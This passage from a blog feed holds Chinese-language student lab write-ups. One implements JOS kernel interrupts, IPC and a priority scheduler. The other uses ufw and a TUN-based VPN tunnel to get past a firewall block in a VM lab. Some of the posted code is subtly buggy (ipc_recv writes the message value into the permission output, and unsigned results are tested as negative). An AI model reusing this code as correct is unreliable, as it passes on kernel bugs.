13"></a>Exercise 13</h3><blockquote><p>Exercise 13. Modify kern/trapentry.S and kern/trap.c to initialize the appropriate entries in the IDT and provide handlers for IRQs 0 through 15. Then modify the code in env_alloc() in kern/env.c to ensure that user environments are always run with interrupts enabled.</p></blockquote><p><strong>trapentry.s</strong></p><pre><code class="hljs c++">TRAPHANDLER_NOEC(handler32, IRQ_OFFSET + IRQ_TIMER)TRAPHANDLER_NOEC(handler33, IRQ_OFFSET + IRQ_KBD)TRAPHANDLER_NOEC(handler34, <span class="hljs-number">34</span>)TRAPHANDLER_NOEC(handler35, <span class="hljs-number">35</span>)TRAPHANDLER_NOEC(handler36, IRQ_OFFSET + IRQ_SERIAL)TRAPHANDLER_NOEC(handler37, <span class="hljs-number">37</span>)TRAPHANDLER_NOEC(handler38, <span class="hljs-number">38</span>)TRAPHANDLER_NOEC(handler39, IRQ_OFFSET + IRQ_SPURIOUS)TRAPHANDLER_NOEC(handler40, <span class="hljs-number">40</span>)TRAPHANDLER_NOEC(handler41, <span class="hljs-number">41</span>)TRAPHANDLER_NOEC(handler42, <span class="hljs-number">42</span>)TRAPHANDLER_NOEC(handler43, <span class="hljs-number">43</span>)TRAPHANDLER_NOEC(handler44, <span class="hljs-number">44</span>)TRAPHANDLER_NOEC(handler45, <span class="hljs-number">45</span>)TRAPHANDLER_NOEC(handler46, IRQ_OFFSET + IRQ_IDE)TRAPHANDLER_NOEC(handler47, <span class="hljs-number">47</span>)TRAPHANDLER_NOEC(handler51, IRQ_OFFSET + IRQ_ERROR)</code></pre><p><strong>trap_init()</strong></p><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler32</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler33</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler34</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler35</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler36</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler37</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler38</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler39</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler40</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler41</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler42</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler43</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler44</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler45</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler46</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler47</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler51</span><span class="hljs-params">()</span></span>;...SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">0</span>], <span class="hljs-number">0</span>, GD_KT, handler32, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">1</span>], <span class="hljs-number">0</span>, GD_KT, handler33, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">2</span>], <span class="hljs-number">0</span>, GD_KT, handler34, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">3</span>], <span class="hljs-number">0</span>, GD_KT, handler35, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">4</span>], <span class="hljs-number">0</span>, GD_KT, handler36, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">5</span>], <span class="hljs-number">0</span>, GD_KT, handler37, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">6</span>], <span class="hljs-number">0</span>, GD_KT, handler38, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">7</span>], <span class="hljs-number">0</span>, GD_KT, handler39, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">8</span>], <span class="hljs-number">0</span>, GD_KT, handler40, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">9</span>], <span class="hljs-number">0</span>, GD_KT, handler41, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">10</span>], <span class="hljs-number">0</span>, GD_KT, handler42, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">11</span>], <span class="hljs-number">0</span>, GD_KT, handler43, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">12</span>], <span class="hljs-number">0</span>, GD_KT, handler44, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">13</span>], <span class="hljs-number">0</span>, GD_KT, handler45, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">14</span>], <span class="hljs-number">0</span>, GD_KT, handler46, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">15</span>], <span class="hljs-number">0</span>, GD_KT, handler47, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">19</span>], <span class="hljs-number">0</span>, GD_KT, handler51, <span class="hljs-number">0</span>);</code></pre><p><strong>env_alloc()</strong></p><pre><code class="hljs c++"><span class="hljs-comment">// Enable interrupts while in user mode.</span><span class="hljs-comment">// LAB 4: Your code here.</span>e-&gt;env_tf.tf_eflags |= FL_IF;</code></pre><h3 id="Exercise-14"><a href="#Exercise-14" class="headerlink" title="Exercise 14"></a>Exercise 14</h3><blockquote><p>Exercise 14. Modify the kernel’s trap_dispatch() function so that it calls sched_yield() to find and run a different environment whenever a clock interrupt takes place.</p></blockquote><p><strong>trap_dispatch()</strong></p><p>修改trap_dispatch()，使得时钟中断发生时，切换到另一个进程执行，按照提示来就可以</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>trap_dispatch(struct Trapframe *tf)&#123;...<span class="hljs-comment">// Handle clock interrupts. Don't forget to acknowledge the</span><span class="hljs-comment">// interrupt using lapic_eoi() before calling the scheduler!</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span> (tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_TIMER) &#123;lapic_eoi();sched_yield();<span class="hljs-comment">// return;</span>&#125;...&#125;</code></pre><h3 id="Exercise-15"><a href="#Exercise-15" class="headerlink" title="Exercise 15"></a>Exercise 15</h3><blockquote><p>Exercise 15. Implement sys_ipc_recv and sys_ipc_try_send in kern/syscall.c. Read the comments on both before implementing them, since they have to work together. When you call envid2env in these routines, you should set the checkperm flag to 0, meaning that any environment is allowed to send IPC messages to any other environment, and the kernel does no special permission checking other than verifying that the target envid is valid.<br>Then implement the ipc_recv and ipc_send functions in lib/ipc.c.</p></blockquote><p><code>sys_ipc_recv()</code>和<code>sys_ipc_try_send()</code>是怎么协作的：</p><ul><li><p>当某个进程调用<code>sys_ipc_recv()</code>后，该进程会阻塞（状态被置为<code>ENV_NOT_RUNNABLE</code>），直到另一个进程向它发送“消息”。当进程调用<code>sys_ipc_recv()</code>传入dstva参数时，表明当前进程准备接收页映射。</p></li><li><p>进程可以调用<code>sys_ipc_try_send()</code>向指定的进程发送“消息”，如果目标进程已经调用了<code>sys_ipc_recv()</code>，那么就发送数据，然后返回0，否则返回<code>-E_IPC_NOT_RECV</code>，表示目标进程不希望接受数据。当传入srcva参数时，表明发送进程希望和接收进程共享srcva对应的物理页。如果发送成功了发送进程的<code>srcva</code>和接收进程的<code>dstva</code>将指向相同的物理页。</p></li></ul><p><strong>sys_ipc_recv()</strong></p><p>需要实现的是进程接受ipc的函数。按惯例检查传入参数，然后分别设置进程自己的ipc接收状态和接收地址，将自己阻塞（状态设为<code>ENV_NOT_RUNNABLE</code>）最后调用<code>sched_yield()</code>运行其他程序即可</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_ipc_recv(<span class="hljs-keyword">void</span> *dstva)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span>(dstva &lt; (<span class="hljs-keyword">void</span>*)UTOP &amp;&amp; PGOFF(dstva) != <span class="hljs-number">0</span>)<span class="hljs-keyword">return</span> -E_INVAL;curenv-&gt;env_ipc_recving = <span class="hljs-literal">true</span>;curenv-&gt;env_ipc_dstva = dstva;curenv-&gt;env_ipc_from = <span class="hljs-number">0</span>;curenv-&gt;env_status = ENV_NOT_RUNNABLE;sched_yield();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><strong>sys_ipc_try_send()</strong></p><p>实现了IPC的发送端函数，将一个值<code>value</code>和一个虚拟地址为<code>srcva</code>的内存页发送给指定的进程。在检查参数后，调用<code>page_lookup()</code>函数查找<code>srcva</code>对应的内存页，并用<code>page_insert()</code>将这个物理页映射给接收进程的指定地址<code>dstva</code>。通过直接设置目标进程的<code>env_ipc_value</code>值即可完成值的传递，并需要以同样方式告知对方发送程序的<code>envid</code>。</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_ipc_try_send(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">uint32_t</span> value, <span class="hljs-keyword">void</span> *srcva, <span class="hljs-keyword">unsigned</span> perm)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> * <span class="hljs-title">envstore</span>;</span><span class="hljs-keyword">if</span> (envid2env(envid, &amp;envstore, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_BAD_ENV;<span class="hljs-keyword">if</span> (envstore-&gt;env_ipc_recving == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_IPC_NOT_RECV;<span class="hljs-keyword">if</span> (srcva &lt; (<span class="hljs-keyword">void</span> *)UTOP) &#123;<span class="hljs-keyword">if</span> ((<span class="hljs-keyword">uintptr_t</span>)srcva % PGSIZE != <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> (((perm&amp;(~(PTE_U|PTE_P|PTE_AVAIL|PTE_W))) != <span class="hljs-number">0</span>)||((perm&amp;(PTE_U | PTE_P)) != (PTE_U | PTE_P))) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">pte_t</span>* pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pg</span> = <span class="hljs-title">page_lookup</span>(<span class="hljs-title">curenv</span>-&gt;<span class="hljs-title">env_pgdir</span>, <span class="hljs-title">srcva</span>, &amp;<span class="hljs-title">pte</span>);</span><span class="hljs-keyword">if</span> (pg == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> ((perm &amp; PTE_W) &amp;&amp; !(*pte &amp; PTE_W)) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> ((<span class="hljs-keyword">uintptr_t</span>)(envstore-&gt;env_ipc_dstva) &lt; UTOP) &#123;<span class="hljs-keyword">uint32_t</span> ret;<span class="hljs-keyword">if</span> ((ret = page_insert(envstore-&gt;env_pgdir, pg, envstore-&gt;env_ipc_dstva, perm)) != <span class="hljs-number">0</span>)<span class="hljs-keyword">return</span> ret;envstore-&gt;env_ipc_perm = perm;&#125;<span class="hljs-keyword">else</span> envstore-&gt;env_ipc_perm = <span class="hljs-number">0</span>;&#125;envstore-&gt;env_ipc_recving = <span class="hljs-number">0</span>;envstore-&gt;env_ipc_from = curenv-&gt;env_id;envstore-&gt;env_ipc_value = value;envstore-&gt;env_status = ENV_RUNNABLE;envstore-&gt;env_tf.tf_regs.reg_eax = <span class="hljs-number">0</span>;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><strong>ipc_recv()</strong></p><p>用户库函数中的ipc接收端。它的主要功能是在接收完成后，判断是否收到了信息，收到了则存入<code>from_env_store</code>和<code>perm_store</code>中，并返回ipc接受到的<code>value</code>。</p><pre><code class="hljs c++"><span class="hljs-keyword">int32_t</span>ipc_recv(<span class="hljs-keyword">envid_t</span> *from_env_store, <span class="hljs-keyword">void</span> *pg, <span class="hljs-keyword">int</span> *perm_store)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span> (pg == <span class="hljs-literal">NULL</span>)pg = (<span class="hljs-keyword">void</span> *)KERNBASE;<span class="hljs-keyword">uint32_t</span> ret = sys_ipc_recv(pg);<span class="hljs-keyword">if</span> (ret != <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">if</span> (from_env_store) *from_env_store = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> (perm_store) *perm_store = <span class="hljs-number">0</span>;<span class="hljs-keyword">return</span> ret;&#125;<span class="hljs-keyword">if</span> (from_env_store) *from_env_store =thisenv-&gt;env_ipc_from;<span class="hljs-keyword">if</span> (perm_store) *perm_store = thisenv-&gt;env_ipc_value;<span class="hljs-keyword">return</span> thisenv-&gt;env_ipc_value;&#125;</code></pre><p><strong>ipc_send()</strong></p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>ipc_send(<span class="hljs-keyword">envid_t</span> to_env, <span class="hljs-keyword">uint32_t</span> val, <span class="hljs-keyword">void</span> *pg, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">uint32_t</span> ret = <span class="hljs-number">1</span>;<span class="hljs-keyword">if</span> (pg == <span class="hljs-literal">NULL</span>)pg = (<span class="hljs-keyword">void</span> *)KERNBASE;<span class="hljs-keyword">while</span> (ret != <span class="hljs-number">0</span>) &#123;ret = sys_ipc_try_send(to_env, val, pg, perm);<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span> &amp;&amp; ret != -E_IPC_NOT_RECV)panic(<span class="hljs-string">"ipc_send:%e"</span>, ret);sys_yield();&#125;&#125;</code></pre><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><h2 id="优先级调度"><a href="#优先级调度" class="headerlink" title="优先级调度"></a>优先级调度</h2><h3 id="优先级调度函数"><a href="#优先级调度函数" class="headerlink" title="优先级调度函数"></a>优先级调度函数</h3><p>我们要实现一个优先级调度函数<code>sched_priority_yield()</code>，作用是根据进程的优先级来选择所要运行的进程，而不是像之前一样，运行找到的第一个可运行进程</p><p>实现思路：此时的优先级应该是在Env结构中存储的，要修改env结构，在里面加入一项<strong>int env_priority</strong>来存储当前进程的优先级，并且在<code>env_alloc()</code>时初始化为-1，而之后的话就只是按照时间顺序来逐渐升高优先级</p><p>而我们的调度函数所要做的就是遍历所有的进程，找到可运行并且优先级最高的那个并且运行它</p><p>具体实现</p><pre><code class="hljs c++"><span class="hljs-comment">//choose a user environment that is both runnable and have the most priority </span><span class="hljs-keyword">void</span>sched_yield(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">idle</span>;</span><span class="hljs-keyword">uint32_t</span> env_index; <span class="hljs-keyword">uint32_t</span> first_env_index;<span class="hljs-keyword">static</span> <span class="hljs-keyword">uint32_t</span> prior = <span class="hljs-number">0</span>;idle = thiscpu-&gt;cpu_env; <span class="hljs-keyword">if</span>(idle == <span class="hljs-literal">NULL</span>)  first_env_index = env_index = <span class="hljs-number">-1</span>; <span class="hljs-keyword">else</span>&#123;  first_env_index = env_index = ENVX(idle-&gt;env_id);  <span class="hljs-keyword">if</span>(idle-&gt;env_priority == <span class="hljs-number">-1</span>)<span class="hljs-comment">//等待时间越长，优先级越高</span>   idle-&gt;env_priority = prior++;&#125; <span class="hljs-keyword">for</span>(<span class="hljs-keyword">uint32_t</span> i = <span class="hljs-number">0</span>; i &lt; NENV; i++)&#123;  <span class="hljs-keyword">uint32_t</span> n = (env_index + i) % NENV;  <span class="hljs-comment">//给没有被调度过的进程设置优先级</span> <span class="hljs-keyword">if</span>(envs[n].env_status == ENV_RUNNABLE &amp;&amp; envs[n].env_priority == <span class="hljs-number">-1</span>)  envs[n].env_priority = prior++;  <span class="hljs-comment">//找到优先级最高的进程</span>  <span class="hljs-keyword">if</span>(envs[n].env_status == ENV_RUNNABLE &amp;&amp; envs[n].env_priority &gt; envs[first_env_index].env_priority)   first_env_index = n; &#125; <span class="hljs-keyword">if</span>(first_env_index != <span class="hljs-number">-1</span>)&#123; env_run(&amp;envs[first_env_index]); <span class="hljs-keyword">return</span>; &#125; <span class="hljs-keyword">if</span>(idle &amp;&amp; idle-&gt;env_status == ENV_RUNNING)&#123; env_run(idle); <span class="hljs-keyword">return</span>; &#125;sched_halt();&#125;</code></pre><p>之后我们需要参考user/yield.c来实现我们的测试文件，我是在原来的基础上直接修改的</p><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inc/lib.h&gt;</span></span><span class="hljs-keyword">void</span>umain(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)&#123;    <span class="hljs-keyword">int</span> i;cprintf(<span class="hljs-string">"Hello, I am environment %08x. Priority: %d\n"</span>, thisenv-&gt;env_id, thisenv-&gt;env_priority);<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;sys_yield();cprintf(<span class="hljs-string">"Back in environment %08x, iteration %d.\n"</span>, thisenv-&gt;env_id, i);&#125;cprintf(<span class="hljs-string">"All done in environment %08x.\n"</span>, thisenv-&gt;env_id);&#125;</code></pre><p>运行结果</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/4-1.png" srcset="/img/loading.gif" alt="4-1"></p><h2 id="问题回答"><a href="#问题回答" class="headerlink" title="问题回答"></a>问题回答</h2><ul><li><h3 id="详细描述JOS启动多个APs的过程"><a href="#详细描述JOS启动多个APs的过程" class="headerlink" title="详细描述JOS启动多个APs的过程"></a>详细描述JOS启动多个APs的过程</h3></li></ul><p>在<code>kern/init.c</code>当中，BSP通过运行<code>i386_init()</code>来完成内存、进程等的初始化，之后就开始了APs的初始化过程，通过调用<code>mp_init()</code>以及<code>lapic_init()</code>两个函数来完成基本的信息收集以及APIC初始化</p><p><code>mp_init()</code>首先从BIOS中获取多处理器配置信息。在BIOS所在的内存区中可以读取MP配置表获得CPU总数，<code>APIC ID</code>，<code>LAPIC</code>的内存映射地址等。随后则由<code>lapic_init()</code>初始化<code>LAPIC</code>上的寄存器。</p><p>在得到基本的CPU信息之后，会转到<code>boot_aps()</code>，由它来一个一个的启动找到的APs。</p><p>在<code>mpentry</code>中，AP从实模式启动，这里与boot.S类似。这时会进行寄存器初始化，<code>GDT</code>载入，设置页表和分页，初始化堆栈等工作。完成后<code>mpentry</code>会调用<code>mp_main()</code>继续进行AP启动工作，设置页表目录，建立<code>LAPIC</code>的<code>MMIO</code>映射，初始化<code>GDT</code>与<code>TSS</code>，设置CPU状态。</p><p>回到<code>boot_aps()</code>，只有当程序确认一个AP启动完成（CPU状态为<code>CPU_STARTED</code>）后，才会继续启动下一个AP；否则会一直忙等。</p><ul><li><h3 id="详细描述JOS中执行COW-fork时，-用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？"><a href="#详细描述JOS中执行COW-fork时，-用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？" class="headerlink" title="详细描述JOS中执行COW fork时， 用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？"></a>详细描述JOS中执行COW fork时， 用户程序一次执行了哪些步骤，这些步骤包含哪些系统调用？</h3></li></ul><ol><li><p>当一个用户程序调用COW fork（即lib中的 <code>fork()</code>）时，<code>fork()</code>首先会将用户程序的页错误处理程序设置为COW专用的<code>pgfault()</code>函数</p></li><li><p>随后会调用<code>sys_exofork()</code>来实现基本的fork进程创建。</p></li></ol><p>在这些步骤中，第一步会涉及到<code>sys_page_alloc()</code>（分配异常处理栈）和<code>sys_env_set_pgfault_upcall()</code>（设置页错误处理程序）。而在用<code>duppage()</code>复制COW页过程中，则会调用<code>sys_getenvid()</code>和<code>sys_page_map()</code>两个系统调用。最后还会用到<code>sys_env_set_status()</code>设定进程状态。</p><ul><li><h3 id="详细描述当进程发生COW相关page-fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？"><a href="#详细描述当进程发生COW相关page-fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？" class="headerlink" title="详细描述当进程发生COW相关page fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？"></a>详细描述当进程发生COW相关page fault时，这个中断是如何被处理的？哪些步骤在内核中，哪些步骤在用户空间中？</h3></li></ul><ol><li><p>在用户程序发生一个页错误后，系统都会陷入内核，调用一般的内核中断处理程序。当中断处理被分发给trap.c中的<code>page_fault_handler()</code>中后，内核的页错误处理程序则会将<code>UTrapframe</code>压入<code>Exception Stack</code>，并开始运行进程自己的COW页错误处理程序<code>pgfault()</code>。</p></li><li><p>之后系统又一次回到用户态，并且执行完成后直接回到用户进程。而在<code>pgfault()</code>中，处理函数会判断页错误类型是否是写入一个COW页面造成的，如果是则将要写入的COW页复制一个，并分配给当前进程的内存空间。</p></li></ol><ul><li><h3 id="user-primes-c-这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪"><a href="#user-primes-c-这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪" class="headerlink" title="user/primes.c 这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪"></a>user/primes.c 这段代码很有趣，请详细解释这段代码如何执行，画出代码流程图，并指出所谓的素数体现在哪</h3></li></ul><p>这段代码实际上就是由一个进程创建一个子进程后，不断地给子进程发送一些数字。每个被创建出来的子进程同样会再创建出一个孩子进程，然后不断给子进程发送数字。main进程发送从2开始的自然数给子进程，子进程留下第一个数字2，即为这个子进程找到的素数。而后子进程会将所有2的倍数筛掉，将剩下的数字再发给自己的子进程（这里也就是main进程子进程的子进程），由被fork出的进程重复这个过程。而每个进程留下的第一个数字一定是素数，因为这个数已经被比他小的数字检验过了–如果是比他小的数字的倍数，会被筛选掉。而这样每个进程就都能够找到一个素数。</p><p>代码流程图：</p><p><img src="/2020/12/07/oslab5-preemptive-mutitasking/5.png" srcset="/img/loading.gif" alt="5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Preemptive-Mutitasking&quot;&gt;&lt;a href=&quot;#Preemptive-Mutitasking&quot; class=&quot;headerlink&quot; title=&quot;Preemptive Mutitasking&quot;&gt;&lt;/a&gt;Preemptive Mutitaski</summary>
      
    
    
    
    
    <category term="Operating System" scheme="http://yoursite.com/tags/Operating-System/"/>
    
  </entry>
  
  <entry>
    <title>Firewall_VPN</title>
    <link href="http://yoursite.com/2020/12/02/Firewall-VPN/"/>
    <id>http://yoursite.com/2020/12/02/Firewall-VPN/</id>
    <published>2020-12-02T10:33:41.000Z</published>
    <updated>2020-12-03T11:51:12.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Firewall-VPN"><a href="#Firewall-VPN" class="headerlink" title="Firewall_VPN"></a>Firewall_VPN</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>在这里，主要是想要对于防火墙的过滤以及对应的VPN（虚拟私人网络）来进行绕过，希望对于VPN的原理能够有一个比较全面的了解</p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task1：VM设置"><a href="#task1：VM设置" class="headerlink" title="task1：VM设置"></a>task1：VM设置</h3><ul><li><p>VM1</p><p>  <img src="/2020/12/02/Firewall-VPN/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p></li><li><p>VM2</p><p>  <img src="/2020/12/02/Firewall-VPN/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p></li></ul><h3 id="task2：设置防火墙"><a href="#task2：设置防火墙" class="headerlink" title="task2：设置防火墙"></a>task2：设置防火墙</h3><p>在这里设置对应的目标网站为<a href="http://www.fudan.edu.cn，通过nslookup查询可知，目标主机IP为202.120.224.81" target="_blank" rel="noopener">www.fudan.edu.cn，通过nslookup查询可知，目标主机IP为202.120.224.81</a></p><blockquote><p>在设置对应的防火墙规则前，我们不能在路由之前进行设置，并且只能在真实的网络接口上面进行设置，而不是在虚拟网络接口上进行设置</p></blockquote><p><img src="/2020/12/02/Firewall-VPN/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>执行对应的下面的命令</p><pre><code class="hljs angelscript">sudo ufw enablesudo ufw deny <span class="hljs-keyword">out</span> on enp0s3 to <span class="hljs-number">202.120</span><span class="hljs-number">.224</span><span class="hljs-number">.81</span>sudo ufw status</code></pre><p><img src="/2020/12/02/Firewall-VPN/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><p>之后清理浏览器缓存并且访问<a href="http://www.fudan.edu.cn，会发现访问被拒绝" target="_blank" rel="noopener">www.fudan.edu.cn，会发现访问被拒绝</a></p><p><img src="/2020/12/02/Firewall-VPN/2-1.PNG" srcset="/img/loading.gif" alt="2-1"></p><h3 id="task3：通过VPN来绕过防火墙"><a href="#task3：通过VPN来绕过防火墙" class="headerlink" title="task3：通过VPN来绕过防火墙"></a>task3：通过VPN来绕过防火墙</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>VM2是一台在防火墙的内网外面的主机，而VM1之所以能绕过防火墙，是通过VM1和VM2之间VPN通道来实现的</p><p>疑问：</p><ul><li>数据包在VPN隧道里面是通过什么协议来实现的</li><li>对应的虚拟网卡是怎么产生的/怎么工作的呢</li></ul><p><img src="/2020/12/02/Firewall-VPN/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><blockquote><p>The vpnclient and vpnserver programs are the two ends of a VPN tunnel. They communicate with each other using either TCP or UDP via the sockets depicted in Figure 3. In our sample code, we choose to use UDP for the sake of simplicity. The dotted line between the client and server depicts the path for the VPN tunnel. The VPN client and server programs connect to the hosting system via a TUN interface, through which they do two things: (1) get IP packets from the hosting system, so the packets can be sent through the tunnel, (2) get IP packets from the tunnel, and then forward it to the hosting system, which will forward the packet to its final destination.</p></blockquote><h4 id="step1：运行VPNserver"><a href="#step1：运行VPNserver" class="headerlink" title="step1：运行VPNserver"></a>step1：运行VPNserver</h4><p>所要做的无非就是两步：1. 建立一个虚拟网卡，给它分配IP地址并让它等待连接 2.打开端口转发功能，让主机作为路由器/网关来出现</p><p><img src="/2020/12/02/Firewall-VPN/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p><img src="/2020/12/02/Firewall-VPN/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><h4 id="step2：运行VPN客户端"><a href="#step2：运行VPN客户端" class="headerlink" title="step2：运行VPN客户端"></a>step2：运行VPN客户端</h4><p>和上面所做的没有什么不同</p><p><img src="/2020/12/02/Firewall-VPN/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><h4 id="step3：在VPN服务端和客户端之间设置路由"><a href="#step3：在VPN服务端和客户端之间设置路由" class="headerlink" title="step3：在VPN服务端和客户端之间设置路由"></a>step3：在VPN服务端和客户端之间设置路由</h4><p>当我们在建立网络的时候，还需要说能够进行基本的通信，这也就需要我们进行路由表的设置，将一些包有选择的放到对应的接口上面去，运行下面的命令并且检查对应的路由表，将对应IP地址为202.120.224.81的IP数据包发往对应的tun0接口</p><pre><code class="hljs routeros">sudo<span class="hljs-built_in"> route </span><span class="hljs-builtin-name">add</span> -host 202.120.224.81 tun0</code></pre><p><img src="/2020/12/02/Firewall-VPN/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><h4 id="step4：在服务器VM上面设置NAT"><a href="#step4：在服务器VM上面设置NAT" class="headerlink" title="step4：在服务器VM上面设置NAT"></a>step4：在服务器VM上面设置NAT</h4><p>为什么会先发给VPN server端的主机</p><p>首先要对于VPN整个过程有个了解，当内网中的A要访问外部网址的时候，首先会产生一个数据包，之后当这个数据包查询本地的路由表的时候，会发现用于发送该数据包的IP地址为主机A的外网网tun0，而目标地址是主机B的外网网关。而当主机B的外网网关收到该数据包的时候，会剥离外面的头部字段并且重新生成新的数据包，之后进行访问对应的外部网址</p><p><strong>总的来说，相当于是将主机A的接受服务放到了B的上面，让B来替A进行访问，所以返回的报文理所当然的是要先到B</strong></p><p>参考：<a href="https://zhuanlan.zhihu.com/p/127785818" target="_blank" rel="noopener">VPN过程</a>、<a 